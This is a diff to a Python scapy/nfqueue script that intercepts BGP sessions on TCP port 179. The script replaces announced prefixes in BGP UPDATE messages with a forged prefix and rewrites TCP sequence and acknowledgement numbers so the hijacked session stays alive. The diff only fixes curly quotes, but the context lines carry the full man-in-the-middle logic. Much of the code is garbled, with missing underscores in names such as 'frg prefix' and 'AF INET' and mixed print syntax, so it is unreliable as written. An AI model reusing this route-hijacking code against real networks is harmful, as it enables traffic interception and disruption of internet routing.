@@ -13,7 +13,7 @@ def seq_mangle(seq, ack, sender, recer, message, or_message, forged, firstforged
             elif prev_type == 'send': #if previous message was again from sender
                 message[TCP].seq = newseq #set as new sequence number the next seq number to be acked stored in newseq variable
                 seq = message[TCP].seq + len(str(or_message[TCP].payload)) #next sequence number to be acked is the seqnum of the message plus message length
-            print(”SEQ ADJUSTED ”)
+            print("SEQ ADJUSTED ")
             if seq > 4294967295: #if sequence number has maxed out wrap around
                 seq = seq−4294967295
             prev_type = 'send' #set previous type to send
@@ -21,7 +21,7 @@ def seq_mangle(seq, ack, sender, recer, message, or_message, forged, firstforged
             ack = message[TCP].ack #store in ack the next number to be used as a sequence number
             message[TCP].ack = seq #set ack as the previous sequence number +previous message length
             prev_type = 'ack' #set previous type ack
-            print(”ACK ADJUSTED”)
+            print("ACK ADJUSTED")
 #delete checksums so they can be recalculated when the packet is send
         del message[IP].chksum
         del message[TCP].chksum
@@ -93,7 +93,7 @@ def bgp_edit(pkt):
                 i = temp2[BGPUpdate].nlri.index(or prefix) #find the index of the prefix in the nlri list
                 temp2[BGPUpdate].nlri.pop(i) #pop(delete) the original nlri from the list
                 temp2[BGPUpdate].nlri.insert(i,frg prefix) #insert the forged prefix in the same index
-                print ”Message Forged...”
+                print "Message Forged..."
                 del temp2[BGPHeader].len #del the bgpheader len to allow scapy to recalculate it
                 forged = True #set the message was forged flag
                 firstfound = True #set the message was forged for the first time flag
@@ -119,12 +119,12 @@ def process(i, payload):
     if proto is 0x06: #if protocol is TCP
         destination = str(pkt[IP].dst) #put packets destination to var destination
         if pkt[TCP].dport == 179 or pkt[TCP].sport == 179:
-            print(”BGP message Detected”)
+            print("BGP message Detected")
             #If the session is reseted stop adjusting seq numbers and start rom scatch
             #if pkt[TCP].flags == 2:
             # firstfound = False
             if firstfound == False:
-                print ”NO CHANGES YET !!!!!!!!!!!”
+                print "NO CHANGES YET !!!!!!!!!!!"
             else:
                 pass
             if destination == '5.6.0.1' and len(str(pkt[TCP].payload))!=0:
@@ -143,7 +143,7 @@ def process(i, payload):
                 if message[TCP].dport == port or message[TCP].sport == port:
                     send(message, verbose=0)
                 else: #If the message is not using the accepted port don't send anything
-                    print(”\n\n YAHAHAHA YOU TRIED BUT FAILED !!!!!!!!!\n\n\n”)
+                    print("\n\n YAHAHAHA YOU TRIED BUT FAILED !!!!!!!!!\n\n\n")
             else: #if session was not forged yet do nothing (the message will be forwarded automatically)
                 pass
         else: #If the message is not bgp do nothing (the message will be forwarded automatically)
@@ -169,7 +169,7 @@ def main():
     plist = sys.argv[2].split('/',2)
     frg_prefix = (int(plist[1]),plist[0])
     
-    load contrib(”bgp”) #load bgp protocol in scapy
+    load contrib("bgp") #load bgp protocol in scapy
     q = nfqueue.queue() #create an nfqueue object where the iptables store the packets
     q.open() #open the queue
     q.bind(socket.AF INET) #bind queue to socket (why ?)
@@ -178,7 +178,7 @@ def main():
     try:
         q.try run() #try running the queue object
     except KeyboardInterrupt: #if ctrl ˆc interruption is used
-        print(”Exiting...”) #print message
+        print("Exiting...") #print message
         q.unbind(socket.AF INET) #unbind socket
         q.close() #close object
         sys.exit(1) #close program
